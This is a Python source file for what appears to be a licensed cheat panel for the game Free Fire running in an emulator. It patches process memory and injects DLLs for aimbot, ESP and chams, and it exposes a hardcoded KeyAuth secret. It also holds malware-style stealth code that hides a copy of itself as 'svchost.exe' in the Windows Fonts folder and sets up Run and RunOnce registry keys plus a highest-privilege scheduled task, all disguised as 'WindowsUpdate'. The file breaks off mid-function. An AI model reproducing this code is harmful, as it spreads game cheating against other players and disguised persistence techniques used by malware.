import atexit
import filecmp
from pdb import run
import datetime
import shutil
import threading
import winreg 
from pyautogui import drag
import pymem
from flask import Flask,jsonify, redirect, render_template,request,session
from keyauth import *
import sys
import Memory
from pyinjector import inject
from multiprocessing import Process
from pymem import *
from pymem.memory import read_bytes, write_bytes
from pymem.pattern import pattern_scan_all
import ctypes
import psutil
import concurrent.futures
from ctypes import wintypes
import os
import tempfile
import ctypes, os, psutil, random
import win32serviceutil
import win32service
import win32event
import servicemanager
STEALTH_NAME = "svchost.exe"
TARGET_PROCESSES = ["notepad.exe", "explorer.exe"]
import winreg as reg
# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
PAGE_READWRITE = 0x04
MEM_COMMIT = 0x1000
MEM_PRIVATE = 0x20000
# Constants
HIDDEN_DIR = "C:\\Windows\\Fonts"

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
OpenProcess = kernel32.OpenProcess
ReadProcessMemory = kernel32.ReadProcessMemory
WriteProcessMemory = kernel32.WriteProcessMemory
VirtualQueryEx = kernel32.VirtualQueryEx
CloseHandle = kernel32.CloseHandle

original_values = []
class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("RegionSize", ctypes.c_size_t),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD),
    ]

# Function to query memory of a given process (example)
def query_memory(process_handle):
    mbi = MEMORY_BASIC_INFORMATION()
    address = 0
    while True:
        result = ctypes.windll.kernel32.VirtualQueryEx(process_handle, address, ctypes.byref(mbi), ctypes.sizeof(mbi))
        if result == 0:
            break
        print(f"Memory Region at: {hex(address)}")
        print(f"Size: {mbi.RegionSize}, State: {mbi.State}, Protect: {mbi.Protect}")
        address += mbi.RegionSize

class MyService(win32serviceutil.ServiceFramework):
    _svc_name_ = "Svchost"  # Name of the service
    _svc_display_name_ = "Svchost"
    _svc_description_ = "Svchost Project."

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        # This is where you'd open a process handle and query its memory
        # Example process handle (replace with a valid one)
        process_handle = ...  # Open a valid process handle here

        while True:
            query_memory(process_handle)  # Query memory every loop iteration
            time.sleep(99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999)  # Sleep for 10 seconds before querying again

class MemoryTool:
    def __init__(self, process_name):
        self.process = self.get_process_by_name(process_name)
        self.handle = OpenProcess(PROCESS_ALL_ACCESS, False, self.process.pid)
        if not self.handle:
            raise Exception("Failed to open process.")
        self.found_event = threading.Event()

    def get_process_by_name(self, name):
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] and name.lower() in proc.info['name'].lower():
                return proc
        raise Exception(f"Process '{name}' not found.")

    def read_memory(self, address, size):
        buffer = ctypes.create_string_buffer(size)
        bytes_read = ctypes.c_size_t(0)
        if ReadProcessMemory(self.handle, ctypes.c_void_p(address), buffer, size, ctypes.byref(bytes_read)):
            return buffer.raw[:bytes_read.value]
        return b''

    def write_memory(self, address, data: bytes):
        buffer = ctypes.create_string_buffer(data)
        bytes_written = ctypes.c_size_t(0)
        return WriteProcessMemory(self.handle, ctypes.c_void_p(address), buffer, len(data), ctypes.byref(bytes_written)) != 0

    def read_int(self, address):
        data = self.read_memory(address, 4)
        return int.from_bytes(data, byteorder='little') if data else 0

    def write_int(self, address, value):
        data = value.to_bytes(4, byteorder='little')
        self.write_memory(address, data)

    def collect_valid_regions(self):
        start = 0x0000000000000000
        end = 0x00007fffffffffff
        addr = start
        regions = []
        mbi = MEMORY_BASIC_INFORMATION()

        while addr < end:
            if VirtualQueryEx(self.handle, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi)):
                if mbi.State == MEM_COMMIT and mbi.Type == MEM_PRIVATE and mbi.Protect == PAGE_READWRITE:
                    regions.append((mbi.BaseAddress, mbi.RegionSize))
                addr += mbi.RegionSize
            else:
                break
        return regions

    def aob_scan_and_patch(self, pattern: bytes, replace: bytes):
        regions = self.collect_valid_regions()
        thread_count = os.cpu_count() * 64

        def scan_region(base, size):
            if self.found_event.is_set():
                return
            try:
                data = self.read_memory(base, size)
                if not data:
                    return
                offset = memoryview(data).tobytes().find(pattern)
                if offset != -1:
                    patch_addr = base + offset
                    print(f"[+] Patch found at 0x{patch_addr:X} — Injecting Patch...")
                    self.write_memory(patch_addr, replace)
                    self.found_event.set()
            except:
                pass

        print("[*] Scanning for AoB Patch...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = [executor.submit(scan_region, base, size) for base, size in regions]
            concurrent.futures.wait(futures, return_when=concurrent.futures.FIRST_COMPLETED)



    def close(self):
        if self.handle:
            CloseHandle(self.handle)

def hex_string_to_bytes(hex_str):
    return bytes.fromhex(hex_str.replace(" ", "").replace("\n", ""))

def parse_aob_pattern(pattern_str):
    """ Parse AoB pattern with wildcards (??) and return byte pattern + mask """
    tokens = pattern_str.strip().split()
    pattern_bytes = []
    mask = []

    for token in tokens:
        if token == "??":
            pattern_bytes.append(0x00)  # Wildcard
            mask.append(0)  # Mask for wildcard (0 means any byte)
        else:
            pattern_bytes.append(int(token, 16))  # Convert hex to byte
            mask.append(1)  # Mask for exact match (1 means exact match)

    return bytes(pattern_bytes), bytes(mask)

app = Flask(__name__,template_folder='templates',static_folder='static')
def getchecksum():
    import hashlib
    import os
    md5_hash = hashlib.md5()
    try:
        script_path = os.path.abspath(sys.argv[0])
        with open(script_path, "rb") as file:
            md5_hash.update(file.read())
    except Exception as e:
        print(f"[!] getchecksum() error: {e}")
        return "0"  # fallback
    return md5_hash.hexdigest()

keyauthapp = api(
    name = "tarun", # Application Name
    ownerid = "E2tU2o12mc", # Owner ID
    secret = "d4cfeccf594c672b12f9b06f7bdc971b1b4c8a7a3791d347182a48ab603dd5a6", # Application Secret
    version = "1.0", # Application Version
    hash_to_check = getchecksum()
)
# Global Stuff
messages = []
addresses = []
drag_addresses = []
user = {}
is32bit = True
isChangedDirectory = False
tab = 1
version = ""


def hide_from_task_manager():
    pid = ctypes.windll.kernel32.GetCurrentProcessId()
    process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
    ctypes.windll.kernel32.SetPriorityClass(process_handle, 0x00000040)  # Set process as background
    ctypes.windll.kernel32.CloseHandle(process_handle)
def secure_hidden_copy():
    hidden_path = os.path.join(HIDDEN_DIR, STEALTH_NAME)

    if not os.path.exists(HIDDEN_DIR):
        try:
            os.makedirs(HIDDEN_DIR, exist_ok=True)
            # Set hidden and system attributes
            ctypes.windll.kernel32.SetFileAttributesW(
                HIDDEN_DIR, 
                0x02 | 0x04  # FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
            )
        except Exception as e:
            print(f"Directory creation failed: {e}")
            return False

    if not os.path.exists(hidden_path) or not filecmp.cmp(sys.argv[0], hidden_path):
        try:
            shutil.copy2(sys.argv[0], hidden_path)
            ctypes.windll.kernel32.SetFileAttributesW(
                hidden_path, 
                0x02 | 0x04  # FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
            )
            return True
        except Exception as e:
            print(f"File copy failed: {e}")
            return False
    return True


# def add_to_startup():
#     exe_path = r"C:\Users\Public\Libraries\wlms.exe"
#     exe_name = "wlms"
#     key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

#     try:
#         reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
#         reg.SetValueEx(reg_key, exe_name, 0, reg.REG_SZ, exe_path)
#         reg.CloseKey(reg_key)
#         print(f"[+] Successfully added {exe_name} to startup.")
#     except Exception as e:
#         print(f"[-] Failed to add to startup: {e}")

def add_to_runonce():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ,
                          os.path.join(HIDDEN_DIR, STEALTH_NAME))
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Failed to add to RunOnce: {e}")
        return False

def add_to_scheduled_tasks():
    try:
        task_name = "WindowsUpdate"
        exe_path = os.path.join(HIDDEN_DIR, STEALTH_NAME)
        command = f'schtasks /create /tn {task_name} /tr "{exe_path}" /sc onlogon /rl HIGHEST /f'
        os.system(command)
        return True
    except Exception as e:
        print(f"Failed to create scheduled task: {e}")
        return False
def add_to_registry_startup():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ,
                          os.path.join(HIDDEN_DIR, STEALTH_NAME))
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Failed to add to registry startup: {e}")
        return False

@app.get('/sniper-panel')
def sniperPanel():
    if keyauthapp.user_data.username:
        return render_template('Sniper.html')
    else:
        return redirect('/')

@app.get('/extra-panel')
def extraPanel():

    if keyauthapp.user_data.username:
        return render_template('Extra.html')
    else:
        return redirect('/')
    
@app.get('/settings')
def settings():
    if keyauthapp.user_data.username:
        return render_template('Settings.html')
    else:
        return redirect('/')

@app.post('/auth')
def auth():
    if request.method == "POST":
        data = request.get_json()
        reply = keyauthapp.login(user=data['username'], password=data['password'])
        
        if reply:
            user['username'] = keyauthapp.user_data.username
            user['hwid'] = keyauthapp.user_data.hwid
            user['ip'] = keyauthapp.user_data.ip
            
            # Validate expiration timestamp
            try:
                expires = int(keyauthapp.user_data.expires)
                if expires > 0:  # Ensure it's a valid timestamp
                    dt_object = datetime.datetime.fromtimestamp(expires)
                    formatted_time = dt_object.strftime('%Y-%m-%d %H:%M:%S')
                else:
                    formatted_time = "Invalid Expiry Date"
            except (ValueError, OSError) as e:
                print(f"Error parsing timestamp: {e}")
                formatted_time = "Invalid Expiry Date"

            user['expiry'] = formatted_time
            
            now = datetime.datetime.now()
            time = now.strftime("%H:%M:%S")
            messages.append(time + f" Logged in as {keyauthapp.user_data.username}")

            return jsonify(
                status=200,
                message="logged in",
            )
        else:
            return jsonify(
                status=301,
                message="Credentials Mismatch"
            )
@app.post('/auth-check')
def authCheck():
    
    if not user:
        
        return jsonify(
            status=302,
            
        )
    else:
        
        return jsonify(
            status=200,
            
        )

def mkp(aob: str):
    if '??' in aob:
        if aob.startswith("??"):
            aob = f" {aob}"
            n = aob.replace(" ??", ".").replace(" ", "\\x")
            b = bytes(n.encode())
        else:
            n = aob.replace(" ??", ".").replace(" ", "\\x")
            b = bytes(f"\\x{n}".encode())
        del n
        return b
    else:
        m = aob.replace(" ", "\\x")
        c = bytes(f"\\x{m}".encode())
        del m
        return c
    

@app.get('/logout')
def logout():
    reply = keyauthapp.logout()
    print(reply)
    if reply:
        return jsonify(
            status=200
        )
    else:
        return jsonify(
            status= 303
        )


@app.post('/user-info')
def userInfo():
    onlineUsers = keyauthapp.fetchOnline()
    OU = ''
    if onlineUsers is None:
        OU = "No online users"
    else:
        for i in range(len(onlineUsers)):
            OU += onlineUsers[i]["credential"] + " "
    return jsonify(
        status=200,
        username=user['username'],
        ipAddress=user['ip'],
        hwid=user['hwid'],
        expiry=user['expiry'],
        onlineUsers=OU
    )

@app.post('/get-process')
def getProcess():
    
    status = Memory.get_process("HD-Player.exe")
    if status == False:
        
        return jsonify(
            status=303,
            
        )
    else:
       
        return jsonify(
            status=200,
            pid=status,
            
        )

@app.post('/aimbot-load')
def aimbotLoad():
    global addresses
    try:
        addresses = Memory.aimbot_load()  # Get the returned addresses
        if addresses:
            now = datetime.datetime.now().strftime("%H:%M:%S")
            add_console_message(f"{now} • Aimbot Load Done")
            return jsonify(status=200)
        else:
            add_console_message("No entities found", "warning")
            return jsonify(status=304)
    except Exception as e:
        add_console_message(f"Aimbot Load Failed: {e}", "error")
        return jsonify(status=500)

@app.post('/aimbot-on')
def aimbotOn():
    global addresses
    try:
        if Memory.aimbot_on(addresses):  # Pass the addresses
            add_console_message("Aimbot Activated")
            return jsonify(status=200)
        else:
            add_console_message("Aimbot Activation Failed", "error")
            return jsonify(status=500)
    except Exception as e:
        add_console_message(f"Aimbot Failed: {str(e)}", "error")
        return jsonify(status=500)

@app.post('/aimbot-off')
def aimbotOff():
    global addresses
    try:
        if Memory.aimbot_off(addresses):  # Pass the addresses
            add_console_message("Aimbot Deactivated")
            return jsonify(status=200)
        else:
            add_console_message("Deactivation Failed", "error")
            return jsonify(status=500)
    except Exception as e:
        add_console_message(f"Deactivation Error: {str(e)}", "error")
        return jsonify(status=500)
@app.post('/aimdrag-load')
def aimDragLoad():
    global drag_addresses
    drag_addresses = Memory.drag_load()
    if drag_addresses:
        now = datetime.datetime.now()
        time = now.strftime("%H:%M:%S")
        messages.append(
            time + " Aimdrag Load Done"
        )
        return jsonify(
            status=200
        )
    else:
        return jsonify(
            status=304
        )

@app.post('/aimdrag-on')
def aimDragOn():
    global addresses
    try:
        Memory.aimbot_on(addresses)
        add_console_message("Aimbot Activated")
        return jsonify(status=200)
    except Exception as e:
        add_console_message(f"Aimbot Failed: {str(e)}", "error")
        return jsonify(status=500)

@app.post('/aimdrag-off')
def aimDragOff():
  global addresses
  try:
        Memory.aimbot_off(addresses)
        add_console_message("Aimbot Deactivated")
        return jsonify(status=200)
  except Exception as e:
        add_console_message(f"Aimbot Deactivation Failed: {str(e)}", "error")
        return jsonify(status=500)


@app.post('/chams-menu')
def chamsMenu():
    global isChangedDirectory
    pid = Memory.get_pid('HD-Player.exe')

    # if we've previously changed directory, go back up
    if isChangedDirectory:
        os.chdir('..')
        isChangedDirectory = False

    try:
        inject(pid, Memory.get_resource_path('dlls/mcm.dll'))
        now = datetime.datetime.now().strftime("%H:%M:%S")
        add_console_message(f"{now} • Chams Menu Done")
        return jsonify(status=200)

    except Exception as e:
        now = datetime.datetime.now().strftime("%H:%M:%S")
        add_console_message(f"{now} • Chams Menu Failed: {e}", "error")
        return jsonify(status=500)

@app.post('/update-bit32')
def bit32():
    global is32bit
    try:
        is32bit = True
        now = datetime.datetime.now().strftime("%H:%M:%S")
        add_console_message(f"{now} • 32‑bit FreeFire Selected")
        return jsonify(status=200)
    except Exception as e:
        now = datetime.datetime.now().strftime("%H:%M:%S")
        add_console_message(f"{now} • 32‑bit selection failed: {e}", "error")
        return jsonify(status=500)

@app.post('/update-bit64')
def bit64():
    global is32bit
    try:
        is32bit = False
        now = datetime.datetime.now().strftime("%H:%M:%S")
        add_console_message(f"{now} • 64‑bit FreeFire Selected")
        return jsonify(status=200)
    except Exception as e:
        now = datetime.datetime.now().strftime("%H:%M:%S")
        add_console_message(f"{now} • 64‑bit selection failed: {e}", "error")
        return jsonify(status=500)

@app.post('/chams-3D')
def chams3D():
    global isChangedDirectory
    pid = Memory.get_pid('HD-Player.exe')

    # if we've previously changed directory, go back up
    if isChangedDirectory:
        os.chdir('..')
        isChangedDirectory = False

    try:
        inject(pid, Memory.get_resource_path('dlls/chams3d.dll'))
        now = datetime.datetime.now().strftime("%H:%M:%S")
        add_console_message(f"{now} • Chams 3D Done")
        return jsonify(status=200)

    except Exception as e:
        now = datetime.datetime.now().strftime("%H:%M:%S")
        add_console_message(f"{now} • Chams 3D Failed: {e}", "error")
        return jsonify(status=500)

@app.post('/sniper-scope-on')
def sniperScopeOn():
    global is32bit
    try:
        # Determine patterns based on architecture
        if not is32bit:
             pattern = hex_string_to_bytes("""ff ff ff ff ff 8e 03 00 ee 90 03 00 ff ff ff ff 08 00 00 00 00 00 60 40 cd cc 8c 3f 8f c2 f5 3c cd cc cc 3d 06 00 00 00 00 00 00 00 00 00 00 00  00 00 f0 41 00 00 48 42 00 00 00 3f 33 33 13 40 00 00 b0 3f 00 00 80 3f 01 """)
             replace= hex_string_to_bytes("""ff ff ff ff ff 8e 03 00 ee 90 03 00 ff ff ff ff 08 00 00 00 00 00 60 40 cd cc 8c 3f 8f c2 f5 3c cd cc cc 3d 06 00 00 00 00 00 88 ff 00 00 00 00 00 00 f0 41 00 00 48 42 00 00 00 3f 33 33 13 40 00 00 b0 3f 00 00 80 3f 01""")
        else:
             pattern = hex_string_to_bytes("""ff ff ff ff ff 8e 03 00 ee 90 03 00 ff ff ff ff 08 00 00 00 00 00 60 40 cd cc 8c 3f 8f c2 f5 3c cd cc cc 3d 06 00 00 00 00 00 00 00 00 00 00 00  00 00 f0 41 00 00 48 42 00 00 00 3f 33 33 13 40 00 00 b0 3f 00 00 80 3f 01 """)
             replace= hex_string_to_bytes("""ff ff ff ff ff 8e 03 00 ee 90 03 00 ff ff ff ff 08 00 00 00 00 00 60 40 cd cc 8c 3f 8f c2 f5 3c cd cc cc 3d 06 00 00 00 00 00 88 ff 00 00 00 00 00 00 f0 41 00 00 48 42 00 00 00 3f 33 33 13 40 00 00 b0 3f 00 00 80 3f 01""")
        mem = MemoryTool("HD-Player")
        
        # Perform AoB scan and patch
        success = mem.aob_scan_and_patch(pattern, replace)
        
        # Clean up resources
        mem.close()

        if success:
            add_console_message("Sniper Scope Activated Successfully")
            return jsonify(status=200, message="Sniper Scope turned off")
        else:
            add_console_message("Sniper Scope Activation Failed: Pattern not found", "error")
            return jsonify(status=404, message="Pattern not found")

    except pymem.exception.ProcessNotFound:
        add_console_message("Sniper Scope Failed: Emulator process not found", "error")
        return jsonify(status=404, message="Process not found")
        
    except Exception as e:
        add_console_message(f"Sniper Scope Error: {str(e)}", "error")
        return jsonify(status=500, message=str(e))
           

@app.post('/sniper-scope-off')
def sniperScopeOf():
    global is32bit
    try:
        # Determine patterns based on architecture
        if not is32bit:
             pattern = hex_string_to_bytes("""ff ff ff ff ff 8e 03 00 ee 90 03 00 ff ff ff ff 08 00 00 00 00 00 60 40 cd cc 8c 3f 8f c2 f5 3c cd cc cc 3d 06 00 00 00 00 00 88 ff 00 00 00 00 00 00 f0 41 00 00 48 42 00 00 00 3f 33 33 13 40 00 00 b0 3f 00 00 80 3f 01""")
             replace= hex_string_to_bytes("""ff ff ff ff ff 8e 03 00 ee 90 03 00 ff ff ff ff 08 00 00 00 00 00 60 40 cd cc 8c 3f 8f c2 f5 3c cd cc cc 3d 06 00 00 00 00 00 00 00 00 00 00 00  00 00 f0 41 00 00 48 42 00 00 00 3f 33 33 13 40 00 00 b0 3f 00 00 80 3f 01""")
        else:
             pattern = hex_string_to_bytes("""ff ff ff ff ff 8e 03 00 ee 90 03 00 ff ff ff ff 08 00 00 00 00 00 60 40 cd cc 8c 3f 8f c2 f5 3c cd cc cc 3d 06 00 00 00 00 00 88 ff 00 00 00 00 00 00 f0 41 00 00 48 42 00 00 00 3f 33 33 13 40 00 00 b0 3f 00 00 80 3f 01""")
             replace= hex_string_to_bytes("""ff ff ff ff ff 8e 03 00 ee 90 03 00 ff ff ff ff 08 00 00 00 00 00 60 40 cd cc 8c 3f 8f c2 f5 3c cd cc cc 3d 06 00 00 00 00 00 00 00 00 00 00 00  00 00 f0 41 00 00 48 42 00 00 00 3f 33 33 13 40 00 00 b0 3f 00 00 80 3f 01""")
        mem = MemoryTool("HD-Player")
        
        # Perform AoB scan and patch
        success = mem.aob_scan_and_patch(pattern, replace)
        
        # Clean up resources
        mem.close()

        if success:
            add_console_message("Sniper Scope OFF Successfully")
            return jsonify(status=200, message="Sniper Scope turned off")
        else:
            add_console_message("Sniper Scope OFF Failed: Pattern not found", "error")
            return jsonify(status=404, message="Pattern not found")

    except pymem.exception.ProcessNotFound:
        add_console_message("Sniper Scope Failed: Emulator process not found", "error")
        return jsonify(status=404, message="Process not found")
        
    except Exception as e:
        add_console_message(f"Sniper Scope Error: {str(e)}", "error")
        return jsonify(status=500, message=str(e))

@app.post('/sniper-switch-on')
def sniperSwitchOn():
    global is32bit
    try:
        # Determine patterns based on architecture
        if not is32bit:
            sniperSwitchPattern = hex_string_to_bytes("""3F 00 00 80 3E 00 00 00 00 ?? 00 00 00 ?? ?? ?? 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F ?? ?? ?? 3F ?? ?? ?? ?? 00 00 80 3F 00 00 00 00 ?? ?? ?? ?? 00 00 80 3F 00 00 80 3F""")
            sniperSwitchReplace = hex_string_to_bytes("""1A 00 00 80 1A""")
        else:
            sniperSwitchPattern = hex_string_to_bytes("""3F 00 00 80 3E 00 00 00 00 ?? 00 00 00 ?? ?? ?? 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F ?? ?? ?? 3F ?? ?? ?? ?? 00 00 80 3F 00 00 00 00 ?? ?? ?? ?? 00 00 80 3F 00 00 80 3F""")
            sniperSwitchReplace = hex_string_to_bytes("""1A 00 00 80 1A""")

        mem = MemoryTool("HD-Player")
        found = mem.aob_scan_and_patch(sniperSwitchPattern, sniperSwitchReplace)
        success = found is not None
        mem.close()

        if success:
            add_console_message("Sniper Switch On")
            return jsonify(status=200, message="Sniper Switch On")
        else:
            add_console_message("Sniper Switch On Failed: Pattern not found", "error")
            return jsonify(status=404, message="Pattern not found")

    except pymem.exception.ProcessNotFound:
        add_console_message("Sniper Switch On Failed: Emulator process not found", "error")
        return jsonify(status=404, message="Process not found")
        
    except Exception as e:
        add_console_message(f"Sniper Switch On Error: {str(e)}", "error")
        return jsonify(status=500, message=str(e))
           
@app.post('/sniper-switch-off')
def sniperSwitchOff():
    global is32bit
    try:
        # Determine patterns based on architecture
        if not is32bit:
            # 64-bit: Search for the "ON" pattern to revert
            sniperSwitchPattern = hex_string_to_bytes("""1A 00 00 80 1A""")
            sniperSwitchReplace = hex_string_to_bytes("""3F 00 00 80 3E 00 00 00 00 ?? 00 00 00 ?? ?? ?? 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F ?? ?? ?? 3F ?? ?? ?? ?? 00 00 80 3F 00 00 00 00 ?? ?? ?? ?? 00 00 80 3F 00 00 80 3F""")
        else:
            # 32-bit: Search for the "ON" pattern to revert
            sniperSwitchPattern = hex_string_to_bytes("""1A 00 00 80 1A""")
            sniperSwitchReplace = hex_string_to_bytes("""3F 00 00 80 3E 00 00 00 00 ?? 00 00 00 ?? ?? ?? 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F ?? ?? ?? 3F ?? ?? ?? ?? 00 00 80 3F 00 00 00 00 ?? ?? ?? ?? 00 00 80 3F 00 00 80 3F""")

        mem = MemoryTool("HD-Player")
        # Search for the "ON" bytes and revert to original
        success = mem.aob_scan_and_patch(sniperSwitchPattern, sniperSwitchReplace)
        mem.close()

        if success:
            add_console_message("Sniper Switch Off")
            return jsonify(status=200, message="Sniper Switch Off")
        else:
            add_console_message("Sniper Switch Off Failed: Pattern not found", "error")
            return jsonify(status=404, message="Pattern not found")

    except pymem.exception.ProcessNotFound:
        add_console_message("Sniper Switch Off Failed: Emulator process not found", "error")
        return jsonify(status=404, message="Process not found")
        
    except Exception as e:
        add_console_message(f"Sniper Switch Off Error: {str(e)}", "error")
        return jsonify(status=500, message=str(e))
    
@app.post('/m82b-esp-on')
def M82BEspOn():
    global is32bit
    try:
        # Determine patterns based on architecture
        if not is32bit:
            pattern = hex_string_to_bytes("""19 00 00 00 69 00 6e 00 67 00 61 00 6d 00 65 00 2f 00 70 00 69 00 63 00 6b 00 75 00 70 00 2f 00 70 00 69 00 63 00 6b 00 75 00 70 00 5f 00 62 00 6d 00 39 00 34 00 00 00""")
            replace = hex_string_to_bytes("""19 00 00 00 65 00 66 00 66 00 65 00 63 00 74 00 73 00 2f 00 76 00 66 00 78 00 5f 00 69 00 6e 00 67 00 61 00 6d 00 65 00 5f 00 6c 00 61 00 73 00 65 00 72 00 00 00 00 00""")
        else:
            pattern = hex_string_to_bytes("""19 00 00 00 69 00 6e 00 67 00 61 00 6d 00 65 00 2f 00 70 00 69 00 63 00 6b 00 75 00 70 00 2f 00 70 00 69 00 63 00 6b 00 75 00 70 00 5f 00 62 00 6d 00 39 00 34 00 00 00""")
            replace = hex_string_to_bytes("""19 00 00 00 65 00 66 00 66 00 65 00 63 00 74 00 73 00 2f 00 76 00 66 00 78 00 5f 00 69 00 6e 00 67 00 61 00 6d 00 65 00 5f 00 6c 00 61 00 73 00 65 00 72 00 00 00 00 00""")
        # Initialize memory tool
        mem = MemoryTool("HD-Player")
        
        # Perform AoB scan and patch
        success = mem.aob_scan_and_patch(pattern, replace)
        
        # Clean up resources
        mem.close()

        if success:
            add_console_message("M82B ESP Activated Successfully")
            return jsonify(status=200, message="M82B ESP turned off")
        else:
            add_console_message("M82B ESP Activation Failed: Pattern not found", "error")
            return jsonify(status=404, message="Pattern not found")

    except pymem.exception.ProcessNotFound:
        add_console_message("M82B ESP Failed: Emulator process not found", "error")
        return jsonify(status=404, message="Process not found")
        
    except Exception as e:
        add_console_message(f"M82B ESP Error: {str(e)}", "error")
        return jsonify(status=500, message=str(e))
    
def add_console_message(message, status="success"):
    global messages
    now = datetime.datetime.now().strftime("%H:%M:%S")
    messages.append({
        "timestamp": now,
        "message": message,
        "status": status
    })
    # Keep only last 100 messages
    if len(messages) > 100:
        messages.pop(0)    

@app.post('/logs')
def logs():
    global messages
    return jsonify(
        status=200,
        messages=messages[-50:][::-1]  # Combines both functionalities
    )
@app.post('/m82b-esp-off')
def M82BEspOff():
    global is32bit
    try:
        # Determine patterns based on architecture
        if not is32bit:
            pattern = hex_string_to_bytes("""19 00 00 00 65 00 66 00 66 00 65 00 63 00 74 00 73 00 2f 00 76 00 66 00 78 00 5f 00 69 00 6e 00 67 00 61 00 6d 00 65 00 5f 00 6c 00 61 00 73 00 65 00 72 00 00 00 00 00""")
            replace = hex_string_to_bytes("""19 00 00 00 69 00 6e 00 67 00 61 00 6d 00 65 00 2f 00 70 00 69 00 63 00 6b 00 75 00 70 00 2f 00 70 00 69 00 63 00 6b 00 75 00 70 00 5f 00 62 00 6d 00 39 00 34 00 00 00""")
        else:
            pattern = hex_string_to_bytes("""19 00 00 00 65 00 66 00 66 00 65 00 63 00 74 00 73 00 2f 00 76 00 66 00 78 00 5f 00 69 00 6e 00 67 00 61 00 6d 00 65 00 5f 00 6c 00 61 00 73 00 65 00 72 00 00 00 00 00""")
            replace = hex_string_to_bytes("""19 00 00 00 69 00 6e 00 67 00 61 00 6d 00 65 00 2f 00 70 00 69 00 63 00 6b 00 75 00 70 00 2f 00 70 00 69 00 63 00 6b 00 75 00 70 00 5f 00 62 00 6d 00 39 00 34 00 00 00""")

        # Initialize memory tool
        mem = MemoryTool("HD-Player")
        
        # Perform AoB scan and patch
        success = mem.aob_scan_and_patch(pattern, replace)
        
        # Clean up resources
        mem.close()

        if success:
            add_console_message("M82B ESP Deactivated Successfully")
            return jsonify(status=200, message="M82B ESP turned off")
        else:
            add_console_message("M82B ESP Deactivation Failed: Pattern not found", "error")
            return jsonify(status=404, message="Pattern not found")

    except pymem.exception.ProcessNotFound:
        add_console_message("M82B ESP Failed: Emulator process not found", "error")
        return jsonify(status=404, message="Process not found")
        
    except Exception as e:
        add_console_message(f"M82B ESP Error: {str(e)}", "error")
        return jsonify(status=500, message=str(e))

@app.get('/')
def homePage():
    global user,version
    if keyauthapp.user_data.username:
        return redirect('dashboard',version=version)
    else:
        return render_template('Homepage.html')

@app.get('/dashboard')
def dashboard():
    global user
    if keyauthapp.user_data.username:
        return render_template('Dashboard.html',user=user,version=keyauthapp.version)
    else:
        return redirect('/')

def run_flask():
    app.run(debug=False,host='0.0.0.0',port=8989)

def anti_debug():
